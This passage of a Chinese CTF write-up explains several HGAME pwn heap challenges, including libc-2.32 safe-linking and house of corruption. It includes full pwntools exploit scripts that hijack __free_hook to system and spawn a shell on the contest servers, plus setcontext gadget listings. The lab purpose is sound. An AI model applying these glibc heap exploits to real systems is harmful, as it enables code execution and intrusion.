class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x563c55bf6730</span> —▸ <span class="number">0x7fe8d8e26be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x563c55bf6730</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure>

<ul>
<li>申请到<code>__free_hook</code>为<code>system</code>，释放数据为<code>/bin/sh</code>的堆块即可。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-2.hgame.lwsec.cn&quot;</span>,<span class="number">30439</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.31.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x10</span>,<span class="string">&#x27;protectt&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">112</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">11</span>,<span class="number">0xa0</span>,p64(free_hook)*<span class="number">20</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">add(<span class="number">12</span>,<span class="number">0x80</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">13</span>,<span class="number">0x80</span>,p64(system))</span><br><span class="line">free(<span class="number">12</span>)</span><br><span class="line">io.interactive()      </span><br></pre></td></tr></table></figure>

<h1 id="WEEK3"><a href="#WEEK3" class="headerlink" title="WEEK3"></a>WEEK3</h1><h2 id="pwn-2"><a href="#pwn-2" class="headerlink" title="pwn"></a>pwn</h2><h3 id="libc-2-32预备知识"><a href="#libc-2-32预备知识" class="headerlink" title="libc-2.32预备知识"></a>libc-2.32预备知识</h3><ul>
<li>引入了<code>-safe-linking(异或加密)</code>机制，其核心思想是：将<strong>指针的地址</strong>右移12位再和<strong>指针本身</strong>异或，该操作在堆块<strong>进入和退出</strong><code>tcache bin</code>时进行：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<ul>
<li><code>chunk</code>放入<code>tcache bin</code>时，其<code>fd</code>指针会进行<code>异或加密</code>，其<code>bk</code>指针会放入<code>tcache</code>，以防<code>double free</code>。</li>
<li><code>chunk</code>从<code>tcache bin</code>被取出时，其<code>fd</code>指针进行<code>反异或操作</code>，其<code>bk</code>指针清零。</li>
<li>以下图为例了解<code>-safe-linking</code>：</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/162275/25/34595/91544/63d209b1F634efe7f/8e1d58f50172a469.png" style="zoom:80%;" />

<ul>
<li>当第一个<code>chunk</code>进入<code>tcache bin</code>时，由于<code>tcache</code>此时为空，故<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0</code>。</li>
<li>当第二个<code>chunk</code>进入<code>tcache bin</code>时，<code>fd = (0x559f965652a0 &gt;&gt; 12) ^ 0x559f965652a0</code>。</li>
<li>第三个同理：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;0x559f96565&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965652a0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f965652a0</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf37c5&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>((<span class="number">0x559f965653c0</span> &gt;&gt; <span class="number">12</span>) ^ <span class="number">0x559f96565330</span>)</span><br><span class="line"><span class="string">&#x27;0x559acfaf3655&#x27;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>不难想到<code>(0x559f965652a0 &gt;&gt; 12)</code>就是第一次<code>free chunk</code>的<code>fd</code>指针，一直参与异或，这也是有些师傅们常说的<code>key</code>。</li>
</ul>
<h3 id="safe-note"><a href="#safe-note" class="headerlink" title="safe_note"></a>safe_note</h3><p><code>libc-2.32</code>环境下带有<code>edit</code>功能的<code>uaf</code>漏洞题目，除了环境不同，其余功能均与<code>WEEK2-pwn-editable_note</code>一致。</p>
<ul>
<li>申请9个<code>0x80</code>大小堆块，释放7个装满<code>tcache bin</code>，再释放一个进入<code>unsorted bin</code>，泄露<code>libc_base</code>即可。<strong>注：puts函数可能被低位‘\x00’截断，可以用edit进行调整。</strong></li>
<li>泄露第一个<code>free chunk</code>的<code>fd</code>指针即<code>key</code>，将<code>key</code>与<code>__free_hook</code>异或，加密结果在取出时便会得到真实的<code>__free_hook</code>地址。</li>
<li>修改第七个<code>free_chunk</code>的<code>fd</code>指针为<code>__free_hook</code>加密结果，再申请两次堆块得到<code>__free_hook</code>地址的控制权，写入<code>system</code>即可。</li>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io=process(&quot;./vuln&quot;)</span></span><br><span class="line">io=remote(<span class="string">&quot;week-3.hgame.lwsec.cn&quot;</span>,<span class="number">30852</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i,<span class="number">0x80</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">7</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x12</span>-<span class="number">96</span>-<span class="number">0x10</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">bd=free_hook^key</span><br><span class="line">edit(<span class="number">6</span>,p64(bd))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">9</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x80</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(system))</span><br><span class="line"></span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="large-note"><a href="#large-note" class="headerlink" title="large_note"></a>large_note</h3><p><code>uaf</code>题型，涉及<code>libc2.32</code>下的<code>house of corruption</code>利用，主要适用于申请<code>largebin</code>大小的<code>chunk</code>题型，利用<code>house of corruption</code>可以改大一个已知地址。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/244018#h2-0">参考博客</a></p>
</blockquote>
<p>该题中<code>add</code>堆块的范围在<code>0x500 ~ 0x900</code>之间，释放的堆块无法进入<code>tcache</code>：</p>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/222362/9/23351/7369/63d38f22F7c1ab05c/2d197bc7a6b55b13.png" style="zoom: 80%;" />

<p>用于利用实现<code>house of corruption</code>的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">    fwd = bck;</span><br><span class="line">    bck = bck-&gt;bk;</span><br><span class="line">    victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">    victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">    fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>申请一个<code>0x520</code>大小的堆块，再申请一个<code>0x500</code>大小的堆块避免合并，再申请一个<code>0x510</code>大小的堆块用于后续触发上述代码（需小于第一个堆块）。</li>
<li>释放掉第一个堆块并泄露<code>libc基址</code>，其进入<code>unsortedbin</code>，如果下一个申请的堆块大于<code>0x520</code>，则位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，否则被切割利用。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/83542/16/24081/51156/63d39605Fa2a878a1/04cb52e12f5ea5d5.png" style="zoom:80%;" />

<ul>
<li>因此申请一个<code>0x600（必须大于0x520）</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/196137/37/31783/63481/63d39663Faa66a407/156f7bb626f4a20d.png" style="zoom:80%;" />

<ul>
<li>修改<code>largebin chunk</code>的<code>bk-&gt;nextsize</code>为目标地址<code>target-0x20</code>，此处我们的<code>target</code>选择<code>mp_+80</code>即存储<code>tcachebin</code>数量的地址，初试为<code>64</code>，涵盖<code>0x10 ~ 0x400</code>，我们要将其改成一个大值。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/33368/1/20074/24348/63d39780F379d4b90/d2d115d721e55e75.png" style="zoom:80%;" />

<ul>
<li>释放第三个堆块，其进入<code>unsortedbin</code>，故技重施再申请一个<code>0x600</code>的堆块，使位于<code>unsortedbin</code>中的<code>free chunk</code>进入<code>largebin</code>，触发<code>house of corruption</code>。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/186253/30/31206/38843/63d396dfFbb6bb1d1/1eb4d20f0f8ca891.png" style="zoom:80%;" />

<ul>
<li>此时再释放的堆块都会进入<code>tcachebin</code>，利用<code>double free</code>完成对<code>__free_hook</code>的劫持即可。</li>
</ul>
<img src="https://kjimg10.360buyimg.com/ott/jfs/t1/31868/14/20447/25602/63d3971eFbb7d2123/dbf9023f33eeddf0.png" style="zoom:80%;" />

<ul>
<li><code>exp</code>如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=process(<span class="string">&quot;./vuln&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;libc-2.32.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">&quot;Index: &quot;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    io.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x500</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x12&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lb=u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">96</span>-<span class="number">0x10</span>-<span class="number">0x12</span>-libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&quot;lb=&quot;</span>+<span class="built_in">hex</span>(lb))</span><br><span class="line"></span><br><span class="line">bin_num=lb+<span class="number">1979008</span>+<span class="number">80</span></span><br><span class="line">free_hook=lb+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system=lb+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(bin_num-<span class="number">0x20</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x600</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">key=u64(io.recv(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">fk=free_hook^key</span><br><span class="line">log.success(<span class="string">&quot;key=&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">5</span>,p64(fk))</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x600</span>)</span><br><span class="line">add(<span class="number">7</span>,<span class="number">0x600</span>)</span><br><span class="line">edit(<span class="number">7</span>,p64(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="note-context"><a href="#note-context" class="headerlink" title="note_context"></a>note_context</h3><p>相比于上题开了沙箱黑名单，禁用了<code>execve</code>。<code>rdi</code>转<code>rdx</code>后<code>setcontext+61</code>一把梭：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// rdi2rdx</span></span><br><span class="line">.text:<span class="number">000000000014B</span>760 <span class="number">48</span> <span class="number">8B</span> <span class="number">57</span> <span class="number">08</span>                   mov     rdx, [rdi+<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000014B</span>764 <span class="number">48</span> <span class="number">89</span> <span class="number">04</span> <span class="number">24</span>                   mov     [rsp+<span class="number">0</span>C8h+var_C8], rax</span><br><span class="line">.text:<span class="number">000000000014B</span>768 FF <span class="number">52</span> <span class="number">20</span>                      call    qword ptr [rdx+<span class="number">20</span>h]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// setcontext+61</span></span><br><span class="line">.text:<span class="number">000000000005306</span>D <span class="number">48</span> <span class="number">8B</span> A2 A0 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rsp, [rdx+<span class="number">0</span>A0h]</span><br><span class="line">.text:<span class="number">0000000000053074</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">9</span>A <span class="number">80</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rbx, [rdx+<span class="number">80</span>h]</span><br><span class="line">.text:<span class="number">000000000005307B</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">6</span>A <span class="number">78</span>                   mov     rbp, [rdx+<span class="number">78</span>h]</span><br><span class="line">.text:<span class="number">000000000005307F</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">62</span> <span class="number">48</span>                   mov     r12, [rdx+<span class="number">48</span>h]</span><br><span class="line">.text:<span class="number">0000000000053083</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">6</span>A <span class="number">50</span>                   mov     r13, [rdx+<span class="number">50</span>h]</span><br><span class="line">.text:<span class="number">0000000000053087</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">72</span> <span class="number">58</span>                   mov     r14, [rdx+<span class="number">58</span>h]</span><br><span class="line">.text:<span class="number">000000000005308B</span> <span class="number">4</span>C <span class="number">8B</span> <span class="number">7</span>A <span class="number">60</span>                   mov     r15, [rdx+<span class="number">60</span>h]</span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">64</span> F7 <span class="number">04</span> <span class="number">25</span> <span class="number">48</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">02</span> <span class="number">00</span>+test    dword ptr fs:<span class="number">48</span>h, <span class="number">2</span></span><br><span class="line">.text:<span class="number">000000000005308F</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">.text:<span class="number">000000000005309B</span> <span class="number">0F</span> <span class="number">84</span> B5 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>             jz      loc_53156</span><br><span class="line"></span><br><span class="line">.text:<span class="number">0000000000053156</span>                               loc_53156:                              ; CODE XREF: setcontext+<span class="number">6B</span>↑j</span><br><span class="line">.text:<span class="number">0000000000053156</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A A8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">0</span>A8h]</span><br><span class="line">.text:<span class="number">000000000005315</span>D <span class="number">51</span>                            push    rcx</span><br><span class="line">.text:<span class="number">000000000005315</span>E <span class="number">48</span> <span class="number">8B</span> <span class="number">72</span> <span class="number">70</span>                   mov     rsi, [rdx+<span class="number">70</span>h]</span><br><span class="line">.text:<span class="number">0000000000053162</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">7</span>A <span class="number">68</span>                   mov     rdi, [rdx+<span class="number">68</span>h]</span><br><span class="line">.text:<span class="number">0000000000053166</span> <span class="number">48</span> <span class="number">8B</span> <span class="number">8</span>A <span class="number">98</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          mov     rcx, [rdx+<span class="number">98</span>h]</span><br><span class="line">.text:<span class="number">000000000005316</span>D <span class="number">4</span>C <span class="number">8B</span> <span class="number">42</span> <span class="number">28</span>                   mov     r8, [rdx+<span class="number">28</span>h]</span><br><span class="line">.text:<span class="number">0000000000053171</span> <span 